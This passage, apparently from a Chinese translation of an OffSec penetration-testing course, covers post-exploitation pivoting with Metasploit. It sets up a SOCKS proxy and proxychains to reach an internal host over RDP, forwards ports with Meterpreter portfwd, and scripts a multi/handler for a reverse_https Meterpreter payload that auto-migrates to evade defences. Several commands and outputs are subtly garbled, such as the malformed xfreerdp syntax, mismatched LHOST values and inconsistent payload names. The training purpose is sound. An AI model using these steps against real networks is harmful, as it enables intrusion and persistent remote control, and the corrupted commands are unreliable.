
`msf6 auxiliary(server/socks_proxy) > set SRHOST 127.0.0.1`

`msf6 auxiliary(server/socks_proxy) > set VERSION 5`

`msf6 auxiliary(server/socks_proxy) > run -j`

[*] 模块在后台运行。

[*] 正在启动 SOCKS 代理

列表 697 - 使用 autoroute 设置 SOCKS 代理

现在我们可以更新代理文件 (`/etc/proxychains.conf`) 来利用 SOCKS 代理。编辑文件后，应如下所示：最后，我们可以使用 `proxies` 运行 `xrdp` 从我们的 Kali 系统获取内部网络目标机器的 GUI 访问。

```
kali@kali:~ sudo proxychains xrdp /v172.16.5.200/luiza
[proxychains] 配置: /etc/proxychains.conf
[proxychains] 预加载 /usr/lib/x86_64-linux-gnu/proxychains.so
[proxychains] 初始化: proxychains-ng 4
[proxychains] 链 127.0.0.1:1080 -> 172.16.5.200:3389 ... OK
```

172.16.5.200 (RDP-Server) 的证书详情：

通用名称 = itwk2

主题: itwk02

发行者: itwk02

指纹: 4b:ef:bb:96:7d:01:53:f0:33:de:89:35:91:a8:3b:f1:b2:70:83:fc:aa

由于您的存储存储中没有 CA，请查看 OpenSSL 文档如何将私有 CA 添加到存储中。信任上述证书吗？(Y/N)

密码：

列表 699 - 获取内部网络的远程桌面访问

PWK - 2023 OffSec Services Limited. 保留所有权利。

# OffSec

`freerdp` 客户端打开了一个新窗口，通过 RDP 为我们提供内部网络中 ITWK02 的 GUI 访问。

![](img/987dcf6ebd8893c565a1d24d724e6_682_0.png)

图 266: 从 Kali Linux 到内部网络的远程桌面访问

图 266 显示我们通过跳转成功连接到第二个目标。我们也可以在 Meterpreter 会话内部使用 `portfwd` 命令使用类似的端口转发技术，将特定端口转发到内部网络。

```
msf6 auxiliary(server/socks_proxy) > sessions -i 12
[*] 正在交互...
```

```
meterpreter > portfwd -h
用法: portfwd [-h] [add | delete | list | flush] [args]
```

+   - 帮助横幅。

- -I: 要交互的端口转发索引（查看 "list" 命令）。

- -L: 要监听的本地端口。Reverse: 要连接的本地端口。

- -l: 要监听的本地主机（可选）。Reverse: 要连接的本地主机。

- -p: 要连接的远程端口。Reverse: 要监听的远程端口。

- -r: 要连接的远程主机。

- -R 表示反向端口转发。

列表 700 - `portfwd` 命令的可用选项

如列表 701 所示，我们创建一个从 `localhost` 端口 3389 到目标主机 (`172.16.5.200`) 端口 3389 的端口转发。

```
meterpreter portfwd add -l 3389 -p 3389 -r 172.16.5.200
[*] 创建本地 TCP 继接：3389 <=> 172.16.5.200:3389
```

列表 701 - 在端口绑定上转发端口转发

让我们通过 `xrdp` 测试到 `127.0.0.1` 的连接，以访问内部网络中的受侵害主机。

```
kali@local:~ sudo xrdp /v127.0.0.1/luiza
```

列表 702 - 使用端口转发获取远程桌面访问

# 使用 Kali Linux 进行 OffSec 渗透测试

在渗透测试中，每想要接收一个传入的反向 shell（`reverse shell`）时，可能需要设置 `multi/handler`。我们可以让 Metasploit 监听器在后台启动 Metasploit 并手动设置每个监听器。我们也可以创建一个资源脚本来为我们完成这项任务。

让我们创建一个资源脚本，为非分阶段负载（`non-staged Payload`）启动一个 `multi/handler`。要做到这一点，我们可以在 `kali` 用户的家目录下创建一个名为 `listener.rc` 的文件，并使用编辑器如 `Mousepad` 打开它.¹⁰²⁵

我们首先需要考虑想要执行的命令顺序。在这个示例中，第一个命令是激活 `multi/handler` 模块。然后我们设置负载，在我们的案例中，负载是 `windows/meterpreter_reverse_https`。接下来，我们可以使用 `LHOST` 和 `LPORT` 来适应我们的需求。

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
```

列表 703 - 激活模块、设置负载和选项

此外，我们可以配置 `AutoRunScript` 以在会话创建后自动执行模块。在这个示例中，让我们使用 `post/windows/manage/migrate` 模块。这将导致生成的 Meterpreter 自动启动后台的 `notepad.exe` 并迁移到那里。自动化进程迁移有助于避免我们的负载被防御机制过早杀死或相关进程终止导致的情况。

```
set AutoRunScript post/windows/manage/migrate
```

列表 704 - 设置 `AutoRunScript` 以迁移会话

让我们还把 `ExitOnSession` 设置为 `false`，以确保监听器在会话创建后继续接受新连接。

```
set ExitOnSession false
```

列表 705 - 将 `ExitOnSession` 设置为 `false` 以在连接后保持 `multi/handler` 处于监听状态

我们还可以通过在已激活的模块或选定的负载中使用 `show advanced` 来配置高级选项，例如 `multi/handler` 中的 `ExitOnSession` 和负载中的 `AutoRunScript`。

最后，我们将添加带有参数 `-z -j` 的 `run` 命令，将其作为后台作业运行，并阻止我们自动与会话交互。

```
run -z -j
```

列表 706 - 启动模块的命令

现在，保存脚本并使用 `msfconsole` 将资源脚本作为 `-f` 参数来启动 Metasploit。

> ¹⁰²⁵ (Ubuntu Manpages, 2019), https://manpages.ubuntu.com/manpages/xenial/en/man1/mousepad.html

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

`kali@kali: sudo msfconsole -r listener.rc`

`[sudo] password for kali:` 

`[+] Processing listener.rc> for ERB directives.`

`resource (listener.rc> use exploit/multi/handler`

`[*] Using configured payload generic/shell_reverse_tcp`

`resource (listener.rc> set PAYLOAD windows/meterpreter/reverse_https`

`PAYLOAD => windows/meterpreter/reverse_https`

`resource (listener.rc> set LHOST 192.168.119.44`

`HOST => 192.168.119.44`

`resource (listener.rc> set LPORT 443`

`LPORT => 443`

`resource (listener.rc> set AutoRunScript post/windows/manage/migrate`

`AutoRunScript => post/windows/manage/migrate`

`resource (listener.rc> set ExitOnSession false`

`ExitOnSession => false`

`resource (listener.rc> run -z`
